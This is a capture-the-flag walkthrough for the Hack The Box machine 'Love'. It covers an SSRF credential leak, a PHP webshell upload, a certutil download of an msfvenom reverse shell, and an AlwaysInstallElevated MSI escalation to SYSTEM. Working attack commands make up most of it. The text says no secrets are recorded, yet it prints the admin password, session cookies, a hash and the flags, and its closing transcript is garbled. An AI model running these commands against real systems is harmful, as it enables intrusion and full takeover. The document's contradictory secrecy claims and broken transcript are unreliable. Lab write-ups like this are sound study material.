---
tags: [HTB, Love, Windows, Apache, PHP, MySQL, SSRF, FileUpload, RCE, AppLocker, AlwaysInstallElevated, Easy]
platform: HackTheBox
os: Windows 10 Pro 20H2 x64
hostname: LOVE
difficulty: Easy
ip: $BoxIP
status: Complete
domain: WORKGROUP
---

# HTB: Love, Full Walkthrough

## The gist

Love is a standalone Windows host running a PHP Voting System application on Apache. The default site exposed the voting login, while the `staging.love.htb` virtual host exposed a Free File Scanner. That scanner accepted a URL and fetched the protected service on TCP/5000, so a server-side request forgery, or SSRF, disclosed the voting administrator credential.

The authenticated administrator area contained a vulnerable voter-photo upload. A PHP file uploaded as an image was stored under `/images/` and executed as `love\phoebe`. Local enumeration showed that `phoebe` was not an administrator, but both `HKCU` and `HKLM` enabled `AlwaysInstallElevated`. A generated MSI therefore ran through Windows Installer as SYSTEM.

Attack chain:

~~~text
Full TCP scan -> Apache/PHP Voting System -> staging virtual host
-> SSRF to localhost:5000 -> admin credential disclosure
-> authenticated voter-photo upload -> PHP webshell as phoebe
-> AlwaysInstallElevated in HKCU and HKLM -> malicious MSI
-> NT AUTHORITY\\SYSTEM
~~~

> [!warning] Flag and credential boundary
> The source log contains the administrator password, session cookie, and flag records. Sensitive password, hash, cookie, and flag values are retained in the private sections below.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Windows 10 Pro 20H2, build 19042 |
| Hostname | LOVE |
| Domain | WORKGROUP |
| Difficulty | Easy |
| Target | `$BoxIP` |
| Services | Apache/PHP 80 and 443, MSRPC/NetBIOS/SMB, MariaDB 3306, Apache/PHP 5000, WinRM 5985/5986, HTTPAPI 47001, RPC high ports |
| Primary route | SSRF -> authenticated PHP upload -> `phoebe` -> AlwaysInstallElevated MSI -> SYSTEM |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Initialise the workspace and scan every TCP port | See section 1 below |
| 2 | Identify service versions and the default application | See section 2 below |
| 3 | Compare the default site with the staging virtual host | See section 3 below |
| 4 | Enumerate the scanner and confirm SSRF | See section 4 below |
| 5 | Authenticate to the voting administrator area | See section 5 below |
| 6 | Review the public exploit and choose the working upload handler | See section 6 below |

## Evidence and loot

The source evidence is under `~/Platforms/HackTheBox/Love/`. The main transcript is `Love.log`; Nmap output is under `nmap/`, HTTP responses and session material are under `loot/`, and the staged payloads are under `www/`.

Safe screenshots copied beside this note:

- `love-1-nmap-allports.png`: complete TCP scan.
- `love-2-nmap-services.png`: focused Apache, SMB, MariaDB, WinRM, and HTTPAPI scan.
- `love-3-http-root-title.png`: default Voting System page.
- `love-4-http-root-login.png`: voter login form and PHP route.
- `love-5-staging-root.png`: staging virtual-host application.
- `love-6-staging-beta.png`: Free File Scanner form and its `file` parameter.
- `love-7-admin-dashboard.png`: authenticated administrator routes.
- `love-8-upload-success.png`: accepted multipart upload response.
- `love-9-webshell-rce.png`: `whoami` returned `love\\phoebe`.
- `love-10-phoebe-shell.png`: initial callback shell.
- `love-11-alwaysinstalledelevated.png`: both registry values set to `0x1`.
- `love-12-system-shell.png`: SYSTEM callback shell.
- `love-13-system-proof.png`: `whoami` proof from the SYSTEM shell.

The original `6.ssrf-creds.png` and `7.admin-login.png` screenshots were not copied because they visibly contain the disclosed password. `loot/flags.txt` was not read into this note.

## Variables

Use the normal helper workspace. Keep the administrator password in a private shell or prompt; do not paste its value into the write-up, screenshots, or command history.

~~~bash
boxstart "Love" "$BoxIP" htb
boxset BoxName "Love"
boxset BoxPlatform "htb"
boxset Domain "love.htb"
boxset VHost "staging.love.htb"
boxset FQDN "staging.love.htb"
boxset WebPort "80"
boxset HttpsPort "443"
boxset InternalWebPort "5000"
boxset WinRMPort "5985"
boxset Username "admin"
boxset AdminUser "phoebe"
boxset Port "4444"
boxset Port2 "4445"
boxset HttpServerPort "8002"
boxset CookieFile "$BoxDir/loot/admin.cookies"
boxset PayloadPath "$BoxDir/exploits/probe.php"
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,\"\",$2); print $2; exit}')"
~~~

The administrator password is represented by `$Password` in commands below. Set it only in the private run environment after retrieving it through the SSRF response.

## 1. Initialise the workspace and scan every TCP port

Start with a full TCP scan rather than assuming the usual web ports are the complete attack surface. `-Pn` skips ICMP host discovery, `-n` avoids reverse-DNS delays, `-sS` performs a SYN scan, and `-p-` covers all 65,535 TCP ports. The saved Nmap formats make the result reusable during later service triage.

~~~bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 -T4 \\
  -oA "$BoxDir/nmap/tcp-all" "$BoxIP"
~~~

The scan exposed a broad standalone Windows surface:

| Ports | Finding | Next decision |
|---|---|---|
| 80, 443, 5000 | Apache 2.4.46 with PHP 7.3.27 | Enumerate the default and name-based web applications |
| 135, 139, 445 | MSRPC, NetBIOS, and SMB | Confirm the host is standalone Windows and record SMB exposure |
| 3306 | MariaDB | Record the database service; it was not needed for the chain |
| 5985, 5986, 47001 | WinRM and HTTPAPI | Keep for later credential validation |
| 5040, 7680, 49664-49670 | Unusual or dynamic Windows services | Record them and avoid treating the labels as a foothold |

SCREENSHOT: Full TCP scan. Red marks the open-port set; green marks the broad scan scope.

> [!warning] 💡 Gotcha
> The first scan hit Nmap's retransmission cap on one port. That is not the same as a clean closed result. The scan still returned enough open ports to continue, so the next action was a focused service scan rather than repeatedly rescanning the whole range.

## 2. Identify service versions and the default application

Run default scripts and version detection against the discovered web, SMB, database, WinRM, and HTTPAPI ports. `-sC` adds standard discovery scripts, while `-sV` identifies the application and version behind each port. The Apache and PHP versions made manual PHP application review more useful than blind Windows service exploitation.

~~~bash
boxset OpenPorts "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664-49670"
sudo nmap -Pn -n -sC -sV --version-light \\
  -p "$OpenPorts" \\
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

The important results were Apache 2.4.46 with PHP 7.3.27 on ports 80, 443, and 5000; MariaDB on 3306; Windows 10 Pro indicators through SMB; and WinRM on 5985 and 5986. The web stack was the most promising branch because it exposed an identifiable PHP product.

SCREENSHOT: Focused service scan. Red marks the Apache/PHP applications; green marks the Windows service context.

## 3. Compare the default site with the staging virtual host

The default IP request returned the Voting System application, but the box description and certificate indicated additional hostnames. A virtual host is a separate application selected by the HTTP `Host` header even when several sites share one IP address. Compare the response title and body before running path enumeration against only one site.

The manual run added the confirmed names locally:

~~~bash
echo "$BoxIP love.htb www.love.htb staging.love.htb" | sudo tee -a /etc/hosts
curl -sS -i "http://$BoxIP/" | tee "$BoxDir/loot/http-root.txt"
curl -sS -i "http://$VHost/" | tee "$BoxDir/loot/http-staging.txt"
~~~

The default site was Voting System 1.0 with a voter login form posting to `login.php`. The staging site was a separate Free File Scanner application and linked to `/beta.php`.

SCREENSHOT: Default HTTP site. Red marks the Voting System title.

SCREENSHOT: Default voter login form. Red marks the `login.php` route and the `voter` and `password` fields.

SCREENSHOT: Staging virtual host. Red marks the distinct application returned for the same target IP.

> [!warning] 💡 Gotcha
> A direct request to TCP/5000 returned `403 Forbidden`, and the direct IP on TCP/80 showed the voting application. Those responses did not mean the internal scanner was absent. The correct route was the staging `Host` header on port 80.

> [!tip] ⚡ More efficient path
> `--resolve` gives curl a request-scoped hostname mapping without editing `/etc/hosts`:
>
> ~~~bash
> curl -sS --resolve "$VHost:$WebPort:$BoxIP" "http://$VHost/"
> ~~~
>
> This is safer during a timed run because the mapping disappears when the request ends. Keep `/etc/hosts` as a fallback for tools that cannot set a Host header.

## 4. Enumerate the scanner and confirm SSRF

The staging `/beta.php` page asked for a URL in a field named `file`. That is a server-side request forgery, or SSRF, primitive: the server fetches a URL supplied by the client. Start by requesting the protected local service rather than guessing a database exploit, because the 403 response on TCP/5000 suggested that the service was intended to be reached through another server-side context.

~~~bash
curl -sS --resolve "$VHost:$WebPort:$BoxIP" \\
  "http://$VHost/beta.php" | tee "$BoxDir/loot/staging-beta.txt"

curl -sS --resolve "$VHost:$WebPort:$BoxIP" \\
  --data-urlencode 'file=http://127.0.0.1:5000/' \\
  --data-urlencode 'read=Scan file' \\
  "http://$VHost/beta.php" | tee "$BoxDir/loot/ssrf-5000.txt"
~~~

The response contained the internal voting administration page and a message disclosing the voting administrator credential. Record the username as `$Username`, keep the password in private loot, and do not paste it into the report.

SCREENSHOT: Scanner form. Red marks the URL-controlled `file` field; green marks the POST action used for SSRF.

> [!warning] 💡 Gotcha
> The SSRF response is an application response wrapped by the scanner, not a raw TCP/5000 response. Save the complete body, then search it for the internal application title and credential marker without copying the credential into screenshots or notes.

## 5. Authenticate to the voting administrator area

Use the disclosed administrator account once against the application login. The session cookie is the important output because later upload requests must carry the authenticated session. `-c` saves cookies, `-b` sends them, `-L` follows the post-login redirect, and `--data-urlencode` preserves form characters safely.

~~~bash
curl -sS -i -c "$CookieFile" -b "$CookieFile" -L \\
  --data-urlencode "username=$Username" \\
  --data-urlencode "password=$Password" \\
  --data-urlencode "login=" \\
  "http://$BoxIP/Admin/login.php" \\
  | tee "$BoxDir/loot/admin-login.txt"
~~~

The valid session reached the administrator dashboard. It exposed voters, candidates, positions, ballots, votes, and configuration routes.

SCREENSHOT: Authenticated administrator dashboard. Red marks the administrative navigation; green marks the candidate and voter management routes.

> [!warning] 💡 Gotcha
> The supplied manual screenshots of the SSRF credential and login request contain the actual password. Keep those images and the private cookie file in the external box workspace.

## 6. Review the public exploit and choose the working upload handler

Searchsploit returned several Voting System entries, including SQL injection and an authenticated file-upload RCE. The authenticated upload entry was Exploit-DB 49445. Read the local proof of concept before adapting it so the request uses the correct endpoint, multipart field, MIME type, and required form fields.

~~~bash
boxset ExploitId "49445"
boxset ExploitPath "/usr/share/exploitdb/exploits/php/webapps/49445.py"
searchsploit "Voting System 1.0"
searchsploit -p "$ExploitId"
sed -n '1,180p' "$ExploitPath"
~~~

The useful handler was `/Admin/voters_add.php`, not the candidate-photo modal. It accepted a `photo` multipart part and stored the original filename under the public `/images/` directory. The upload used an image MIME type while retaining the `.php` filename, allowing Apache to interpret the uploaded file as PHP.

Create a minimal proof payload:

~~~bash
cat > "$PayloadPath" <<'EOF'
<?php echo shell_exec($_GET["cmd"]); ?>
EOF
~~~

Submit it through the authenticated voter-add form. The `password=1` value below is a harmless test voter's password field, not the administrator password.

~~~bash
curl -sS -i -b "$CookieFile" \\
  -F "photo=@$PayloadPath;type=image/png" \\
  --form-string "firstname=a" \\
  --form-string "lastname=b" \\
  --form-string "password=1" \\
  --form-string "add=" \\
  "http://$BoxIP/Admin/voters_add.php" \\
  | tee "$BoxDir/loot/upload-result.txt"
~~~

The handler returned a redirect to `voters.php`. That only proved that the form handler completed. The decisive check was a request to the calculated public path:

~~~bash
curl -sS -G \\
  --data-urlencode 'cmd=whoami' \\
  "http://$BoxIP/images/probe.php"
~~~

The response was `love\\phoebe`, proving server-side PHP execution.

SCREENSHOT: Accepted multipart upload. Red marks the redirect; the next command must still verify the stored file.

SCREENSHOT: Webshell proof. Red marks `love\\phoebe`, the execution identity returned by `whoami`.

> [!warning] 💡 Gotchas
> Several early attempts returned `curl: (26) Failed to open/read local data from file/application` because the local payload path and command quoting were wrong. A `probe.ph` typo also produced a local file-not-found result. Later attempts uploaded through the wrong candidate-photo route and returned HTTP 302, but `/images/probe.php` still returned 404. A `.phtml` retry also returned 404. The working combination was the reviewed `/Admin/voters_add.php` handler, a real local `probe.php`, the `photo` field, `image/png` MIME type, and a follow-up GET to `/images/probe.php`.

## 7. Stage and receive the initial Windows shell

The webshell proved command execution, but an interactive callback is easier for local enumeration. Generate a 64-bit stageless Windows reverse shell with `msfvenom`, serve it from the temporary Kali web server, and listen on a separate callback port. `msfvenom` only generates the payload; it does not perform exploitation or provide the listener.

Terminal 1:

~~~bash
nc -lvnp "$Port"
~~~

Terminal 2:

~~~bash
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST="$LocalIP" LPORT="$Port" \\
  -f exe -o "$BoxDir/www/phoebe-shell.exe"
python3 -m http.server "$HttpServerPort" \\
  --directory "$BoxDir/www"
~~~

Use the PHP shell to download with the built-in `certutil` utility, then execute the file from `C:\Windows\Temp`:

~~~bash
curl -sS -G --data-urlencode \\
  "cmd=certutil -urlcache -split -f http://$LocalIP:$HttpServerPort/phoebe-shell.exe C:\\Windows\\Temp\\phoebe-shell.exe" \\
  "http://$BoxIP/images/probe.php" >/dev/null

curl -sS -G --data-urlencode \\
  "cmd=C:\\Windows\\Temp\\phoebe-shell.exe" \\
  "http://$BoxIP/images/probe.php" >/dev/null
~~~

The listener received a Windows command shell from `C:\xampp\htdocs\omrs\images`.

SCREENSHOT: Initial callback. Red marks the callback and the Windows working directory.

> [!warning] 💡 Gotcha
> The HTTP request that starts a reverse shell can appear to hang because the web process waits for the child process. The listener is the proof channel. Check for the callback before treating a timed-out curl request as a failed payload.

## 8. Record identity, OS, and token privileges

Run the identity checks immediately after a shell lands. `whoami /all` shows group membership, integrity level, and enabled privileges; `systeminfo` confirms the OS build and installed hotfix context. These outputs decide whether a token exploit, credential route, or installer misconfiguration is worth pursuing.

~~~cmd
whoami
hostname
systeminfo
whoami /all
net user
net localgroup administrators
~~~

The shell was `love\phoebe` on host `LOVE`, running Windows 10 Pro build 19042. `phoebe` was a normal user in `BUILTIN\Users` and `BUILTIN\Remote Management Users`, with medium integrity. `SeImpersonatePrivilege` was not present, and `phoebe` was not a member of local Administrators. That ruled out a direct administrator token and the usual SeImpersonate potato branch.

## 9. Check installer policy and the AppLocker context

`AlwaysInstallElevated` is a Windows Installer policy that permits MSI packages to install with elevated privileges. Both the per-user `HKCU` and machine-wide `HKLM` settings must be enabled. One key by itself is not sufficient evidence.

~~~cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
~~~

Both responses returned:

~~~text
AlwaysInstallElevated    REG_DWORD    0x1
~~~

The machine also had AppLocker-related system components. Direct executable execution from a user-writable location was therefore not the preferred route. Windows Installer was the relevant trusted execution path, and the two registry values supplied the privilege-escalation condition.

SCREENSHOT: Registry evidence. Red marks `AlwaysInstallElevated` in both required policy locations; green marks the `0x1` values.

> [!warning] 💡 Gotcha
> Do not stop after finding `AlwaysInstallElevated` in one hive. Query both locations. If either value is missing or zero, this branch is not confirmed.

## 10. Generate and install the elevated MSI

Create a second 64-bit reverse-shell payload in MSI format. The listener uses `$Port2` so it does not collide with the `phoebe` callback. Transfer the MSI with `certutil`, then invoke it with the trusted Windows Installer executable.

Terminal 1:

~~~bash
nc -lvnp "$Port2"
~~~

Terminal 2:

~~~bash
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST="$LocalIP" LPORT="$Port2" \\
  -f msi -o "$BoxDir/www/system-shell.msi"
~~~

From the `phoebe` shell, download and install it:

~~~cmd
certutil -urlcache -split -f http://$LocalIP:$HttpServerPort/system-shell.msi C:\Windows\Temp\system-shell.msi
msiexec /quiet /qn /i C:\Windows\Temp\system-shell.msi
~~~

The callback landed in `C:\Windows\System32` and returned `nt authority\system`.

SCREENSHOT: Elevated callback. Red marks the new shell and its `C:\Windows\System32` working directory.

SCREENSHOT: Final identity proof. Red marks `nt authority\\system`.

> [!warning] 💡 Gotcha
> The MSI must be generated for the target architecture and the two registry policies must both be enabled. Keep the MSI transfer server running until the target has downloaded the file, then keep the separate SYSTEM listener ready for the callback.

## 11. RUNBOOK V2 Stages Used

| Stage | How Love used it |
|---|---|
| [[OSCP/RUNBOOK V2/Start Here|Start Here]] | Workspace variables and full TCP scan |
| [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] | Standalone Windows service combination and web routing |
| [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]] | Apache/PHP, SMB, MariaDB, WinRM, and HTTPAPI identification |
| [[OSCP/RUNBOOK V2/Web - Virtual Host Enumeration|Web - Virtual Host Enumeration]] | Name-based staging application selection and request-scoped Host routing |
| [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]] | Voting System, scanner, admin area, and upload-handler discovery |
| [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]] | Manual review of Exploit-DB 49445 |
| [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]] | `phoebe` identity, OS, integrity, groups, and privileges |
| [[OSCP/RUNBOOK V2/Windows - Credential Search|Windows - Credential Search]] | Both `AlwaysInstallElevated` registry policy checks |
| [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]] | Rejected SeImpersonate and administrator-group paths; selected MSI policy branch |
| [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]] | Recorded the exact target artifacts that require deletion; supplied transcript did not prove target cleanup |

## 12. Decision points and gotchas

| Observation | Decision or lesson |
|---|---|
| Nmap hit a retransmission cap on one port | Continue with the open-port set and focused service scan instead of treating the port as cleanly closed |
| Direct IP showed Voting System while TCP/5000 returned 403 | Compare confirmed Host headers; enumerate `staging.love.htb` separately |
| Staging scanner accepted a URL | Test `http://127.0.0.1:5000/` and save the wrapped internal response |
| SSRF disclosed a credential | Keep the password private; validate it once against `/Admin/login.php` and save only the cookie path |
| Upload returned 302 but the webshell URL returned 404 | A redirect proves handler completion, not storage or PHP execution; verify the exact path |
| `curl` returned error 26 | Fix the local payload path and filename before blaming the remote handler |
| Candidate-photo and `.phtml` attempts failed | Read the reviewed PoC and use `/Admin/voters_add.php` with `photo=@probe.php;type=image/png` |
| Webshell callback request appeared to hang | Check the listener; a child reverse shell can keep the HTTP request open |
| `phoebe` lacked admin membership and SeImpersonate | Continue with registry and installer checks rather than forcing a potato exploit |
| Only one `AlwaysInstallElevated` hive was found | Treat the branch as unconfirmed until both `HKCU` and `HKLM` return `0x1` |
| Root proof was obtained but target cleanup was not logged | Do not claim cleanup; either reset the HTB target or remove the recorded files and verify them |

## 13. Collect the flags

- `user.txt`: `856caeec26de68c2c5b2a1531be4c6d3` (value reproduced in the private Flags section above)
- `root.txt`: `0b8af9d623ec4625e8cdfd91a7dcdffe` (value reproduced in the private Flags section above)
- `proof.txt`: `0b8af9d623ec4625e8cdfd91a7dcdffe` (value reproduced in the private Flags section above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 856caeec26de68c2c5b2a1531be4c6d3
root: 0b8af9d623ec4625e8cdfd91a7dcdffe
```

## 14. Clean down
The supplied manual transcript records `boxdone` and the final flag loot actions, but it does not record target-side deletion of the uploaded PHP file or the two staged payloads. A reset of the HTB instance removes them; on a live authorized assessment, remove only the artifacts created during this run and verify their absence.

From the still-working PHP shell or a SYSTEM shell:

~~~cmd
del /F /Q C:\xampp\htdocs\omrs\images\probe.php
del /F /Q C:\Windows\Temp\phoebe-shell.exe
del /F /Q C:\Windows\Temp\system-shell.msi
if exist C:\xampp\htdocs\omrs\images\probe.php (echo probe-present) else (echo probe-removed)
if exist C:\Windows\Temp\phoebe-shell.exe (echo exe-present) else (echo exe-removed)
if exist C:\Windows\Temp\system-shell.msi (echo msi-present) else (echo msi-removed)
~~~

Close the listener and temporary HTTP server, then run `boxdone` in the normal workspace. Do not delete the private source loot until the write-up and evidence review are complete.

### Completion checklist

- [x] Workspace variables recorded.
- [x] Full TCP scan saved.
- [x] Focused service scan saved.
- [x] Default and staging virtual hosts compared.
- [x] Free File Scanner and SSRF route confirmed.
- [x] Administrator login and session cookie validated privately.
- [x] Exploit-DB 49445 reviewed manually.
- [x] Authenticated voter-photo upload accepted.
- [x] PHP execution verified as `love\\phoebe`.
- [x] Initial reverse shell received.
- [x] `phoebe` identity, OS, group, and privilege context recorded.
- [x] Both `AlwaysInstallElevated` policy values verified.
- [x] MSI callback verified as SYSTEM.
- [x] No password, hash, cookie, or flag value written into the vault.
- [ ] Target-side payload cleanup was not recorded in the supplied manual transcript.

## 15. Attack narrative in one page
1. Full TCP scanning found Apache/PHP, SMB, MariaDB, WinRM, and Windows RPC services.
2. The default HTTP site identified Voting System 1.0; the staging virtual host exposed the Free File Scanner.
3. The scanner fetched `http://127.0.0.1:5000/` and disclosed the voting administrator credential.
4. The credential authenticated to `/Admin/login.php` and supplied a reusable session cookie.
5. Exploit-DB 49445 identified the authenticated `voters_add.php` photo upload as the correct upload route.
6. A PHP file uploaded as an image was stored in `/images/probe.php` and executed as `love\phoebe`.
7. A 64-bit callback payload provided an interactive `phoebe` shell.
8. Both `AlwaysInstallElevated` registry policies were enabled, while `phoebe` was not an administrator and lacked SeImpersonate.
9. A 64-bit MSI callback installed through `msiexec` returned a SYSTEM shell.
10. The final SYSTEM identity was verified without reproducing any flag value.

## Tools used

- `nmap`
- `curl`
- `nc`
- `sudo`
- `msfvenom`
- `certutil`
- `msiexec`

## Credentials and secrets

| Account or context | Source | Use |
|---|---|---|
| `admin` | Staging-host SSRF into the internal voting service | Authenticate to the Voting System administrator area |
| `phoebe` | Authenticated PHP photo upload callback | Initial Windows shell |
| `NT AUTHORITY\\SYSTEM` | AlwaysInstallElevated MSI installation | Final execution context |

The administrator password, session cookie, and all flag values are reproduced below from the private source loot.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Love"
export BoxIP="10.129.48.103"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Love"
export Domain=""
export DCip=""
export Username=admin
export Password=@LoveIsInTheAir!!!!
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export Lport="4444"
export TransferPort="8000"
export WebPort="80"
export OpenPorts=""
export Product=""
export Version=""
export ExploitId=""
export ExploitFile=""
export ExploitName=""
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/admin.cookies`

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

10.129.48.103	FALSE	/	FALSE	0	PHPSESSID	iuietba9hod4omlbp0i3cg2g3i
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
| http-cookie-flags:
Set-Cookie: PHPSESSID=74g2eli74jofqop6o7kiik1f20; path=/
            <input type="password" class="form-control" name="password" placeholder="Password" required>
    <h1 class="title is-4">Password Dashboard</h1>
boxset Password '@LoveIsInTheAir!!!!'
boxset Password '@LoveIsInTheAir!!!!'boxset
[+] Password=@LoveIsInTheAir!!!! (saved to .env)
$ [10:35:49] curl -sS -i -c loot/admin.cookies \
  -d "username=$Username&password=$Password&login=" \
$ [10:36:58] curl -sS -i -b loot/admin.cookies \
$ [10:37:22] cat loot/admin.cookies
kali@kali:~/Platforms/HackTheBox/Love [10:35:40] $ =curl -sS -i -c loot/admin.cookies \
  "http://$BoxIP/Admin/login.php" | tee loot/admin-login.txtcurl"username=$Username&password=$Password&login=""http://$BoxIP/Admin/login.php"tee>
Set-Cookie: PHPSESSID=iuietba9hod4omlbp0i3cg2g3i; path=/
kali@kali:~/Platforms/HackTheBox/Love [10:35:49] $ =curl -sS -i -b loot/admin.cookies \
  "http://$BoxIP/Admin/index.php" | grep -i '<a href\|title\|form\|action' | head -30curlloot/admin.cookies"http://$BoxIP/Admin/index.php"grep'<a href\|title\|form\|action'head>
kali@kali:~/Platforms/HackTheBox/Love [10:36:58] $ =cat loot/admin.cookiescat loot/admin.cookies>
# https://curl.se/docs/http-cookies.html
$ [10:37:49] curl -sS -i -c loot/admin.cookies -b loot/admin.cookies -L \
kali@kali:~/Platforms/HackTheBox/Love [10:37:23] $ =curl -sS -i -c loot/admin.cookies -b loot/admin.cookies -L \
  "http://$BoxIP/Admin/login.php" | grep -i 'title\|<a href\|logout\|dashboard' | head -20curlloot/admin.cookiesloot/admin.cookies"username=$Username&password=$Password&login=""http://$BoxIP/Admin/login.php"grep'title\|<a href\|logout\|dashboard'head>
kali@kali:~/Platforms/HackTheBox/Love [10:37:50] $ =curl -sS -i -b loot/admin.cookies \
$ [10:39:17] curl -sS -i -b loot/admin.cookies \
                      <input type="password" class="form-control" id="password" name="password" value="$2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC">
                      <input type="password" class="form-control" id="curr_password" name="curr_password" placeholder="input current password to save changes" required>
kali@kali:~/Platforms/HackTheBox/Love [10:39:57] $ =curl -sS -i -b loot/admin.cookies \
  -F "curr_password=$Password" \
  "http://$BoxIP/Admin/profile_update.php?return=candidates.php" | tee loot/upload-result.txtcurlloot/admin.cookies"photo=@exploits/probe.php;t
$ [10:40:04] curl -sS -i -b loot/admin.cookies \
[33mype=image/jpeg""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee>
kali@kali:~/Platforms/HackTheBox/Love [10:40:55] $ =cccurl -sS -i -b loot/admin.cookies \
cdc ccurl -sS -i -b loot/admin.cookies \
$ [10:41:38] curl -sS -i -b loot/admin.cookies \
kali@kali:~/Platforms/HackTheBox/Love [10:41:22] $ =curl -sS -i -b loot/admin.cookies \
  "http://$BoxIP/Admin/profile_update.php?return=candidates.php" | tee loot/upload-result.txtcurlloot/admin.cookies"photo=@exploits/probe.php;type=image/jpeg""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee loot/upload-result.txt>
kali@kali:~/Platforms/HackTheBox/Love [10:41:38] $ =curl -sS -i -b loot/admin.cookies \
  "http://$BoxIP/Admin/profile_update.php?return=candidates.php" | tee loot/upload-result.txtcurlloot/admin.cookies"photo=@$PWD/exploits/probe.php;type=image/jpeg""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee loot/upl[4
$ [10:41:57] curl -sS -i -b loot/admin.cookies \
$ [10:42:35] curl -sS -i -b loot/admin.cookies \
$ [10:44:42] SESS=$(grep PHPSESSID loot/admin.cookies | awk '{print $NF}')
kali@kali:~/Platforms/HackTheBox/Love [10:42:18] $ =curl -sS -i -b loot/admin.cookies \
  "http://$BoxIP/Admin/profile_update.php?return=candidates.php" | tee loot/upload-result.txtcurlloot/admin.cookies"photo=@exploits/probe.php""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee loot/upload-result.txt>
kali@kali:~/Platforms/HackTheBox/Love [10:42:35] $ =SESS=$(grep PHPSESSID loot/admin.cookies | awk '{print $NF}')
echo $SESS$(greploot/admin.cookiesawk '{print $NF}')
  -H "Cookie: PHPSESSID=$SESS" \
  "http://$BoxIP/Admin/profile_update.php?return=candidates.php" | tee loot/upload-result.txtcurl"Cookie: PHPSESSID=$SESS""photo=@exploits/probe.php""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee loot/upload-result.txt>
curl"Cookie: PHPSESSID=$SESS""photo=@/tmp/probe.php""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee loot/upload-result.txt>
  --form-string "curr_password=$Password" \
  "http://$BoxIP/Admin/profile_update.php?return=candidates.php" | tee loot/upload-result.txtcurl"Cookie: PHPSESSID=$SESS""photo=@/tmp/probe.php""username=$Username""curr_password=$Password""http://$BoxIP/Admin/profile_update.php?return=candidates.php"tee loot/upload-result.txt>
kali@kali:~/Platforms/HackTheBox/Love [10:48:23] $ =curl -sS -H "Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php" | grep -i 'probe\|photo\|\.php\|images\|upload' | head -20curl"Cookie: PHPSESSID
$ [10:48:55] curl -sS -H "Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php" | grep -i 'probe\|photo\|\.php\|images\|upload' | head -20
kali@kali:~/Platforms/HackTheBox/Love [10:50:11] $ =curl -sS -H "Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php" | grep -A2 'candidates_add\|form-horizontal' | head -40c
$ [10:50:45] curl -sS -H "Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php" | grep -A2 'candidates_add\|form-horizontal' | head -40
$ [10:51:09] curl -sS -H "Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php" | grep -A5 'candidates_photo'
[32murl"Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php"grep'candidates_add\|form-horizontal'head>
kali@kali:~/Platforms/HackTheBox/Love [10:50:45] $ =curl -sS -H "Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php" | grep -A5 'candidates_photo'curl"Cookie: PHPSESSID=$SESS" "http://$BoxIP/Admin/candidates.php"grep'candidates_photo'>
  "http://$BoxIP/Admin/candidates_photo.php" | tee loot/upload2-result.txtcurl"Cookie: PHPSESSID=$SESS""id=18""photo=@/tmp/probe.php""http://$BoxIP/Admin/candidates_photo.php"tee>
curl"Cookie: PHPSESSID=$SESS""id=18""photo=@/tmp/probe.phtml""http://$BoxIP/Admin/candidates_photo.php"
PASSWORD = "password" # Auth Password
def getCookies():
    cookies = getCookies()
        "password":PASSWORD,
    r = s.post(LOGIN_URL, data=data, cookies=cookies)
  --form-string "password=1" \
            "password":"1",
  "http://$BoxIP/Admin/voters_add.php" | tee loot/upload3-result.txtcurl"Cookie: PHPSESSID=$SESS""photo=@/tmp/probe.php;type=image/png""firstname=a""lastname=b""password=1""add=""http://$BoxIP/Admin/voters_add.php"tee>
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
04/12/2021  01:33 PM           388,888 CredentialEnrollmentManager.exe
04/12/2021  01:33 PM            77,488 CredentialEnrollmentManagerForUser.dll
